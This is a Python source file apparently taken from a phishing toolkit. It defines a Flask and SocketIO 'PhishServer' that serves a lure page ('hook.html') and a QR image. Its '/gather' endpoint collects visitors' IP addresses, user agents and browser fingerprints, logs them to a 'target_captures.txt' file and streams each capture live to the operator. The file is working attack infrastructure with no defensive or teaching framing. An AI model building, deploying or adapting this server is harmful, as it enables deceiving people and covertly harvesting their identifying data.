import time
import threading
from pathlib import Path
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO


class PhishServer:
    """Flask server that hosts the phishing page and collects fingerprints."""

    def __init__(self, host: str, port: int, static_dir: str, template_dir: str, output_dir: str):
        self.host = host
        self.port = port
        self.output_dir = Path(output_dir)

        self.app = Flask(
            __name__,
            static_folder=static_dir,
            template_folder=template_dir,
        )
        self.app.config["SECRET_KEY"] = f"wd_{int(time.time())}"
        self.sio = SocketIO(self.app, cors_allowed_origins="*", async_mode="threading")

        self.hits: list[dict] = []
        self._thread: threading.Thread | None = None
        self._wire_routes()

    def _wire_routes(self):
        @self.app.route("/")
        def landing():
            return render_template("hook.html")

        @self.app.route("/qr.png")
        def qr_image():
            return send_from_directory(
                self.app.static_folder, "qr.png",
                mimetype="image/png",
                max_age=0,
            )

        @self.app.route("/gather", methods=["POST"])
        def gather():
            blob = request.get_json(silent=True) or {}
            ip_addr = request.headers.get("X-Forwarded-For", request.remote_addr)
            ua = request.headers.get("User-Agent", "")

            record = {
                "ip": ip_addr,
                "ua": ua,
                "when": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "fp": blob,
            }
            self.hits.append(record)
            self._persist_hit(record)
            self.sio.emit("hit", record)
            return jsonify({"ok": 1})

        @self.app.route("/heartbeat")
        def heartbeat():
            return "up"

    def _persist_hit(self, rec: dict):
        fpath = self.output_dir / "target_captures.txt"
        with open(fpath, "a", encoding="utf-8") as fh:
            fh.write(f"\n{'='*55}\n")
            fh.write(f"CAPTURE @ {rec['when']}\n")
            fh.write(f"IP ......: {rec['ip']}\n")
            fh.write(f"UA ......: {rec['ua']}\n")
            for k, v in rec.get("fp", {}).items():
                fh.write(f"{k:.<20}: {v}\n")
            fh.write(f"{'='*55}\n")

    def launch(self) -> threading.Thread:
        self._thread = threading.Thread(
            target=lambda: self.sio.run(
                self.app,
                host=self.host,
                port=self.port,
                debug=False,
                use_reloader=False,
                allow_unsafe_werkzeug=True,
            ),
            daemon=True,
        )
        self._thread.start()
        return self._thread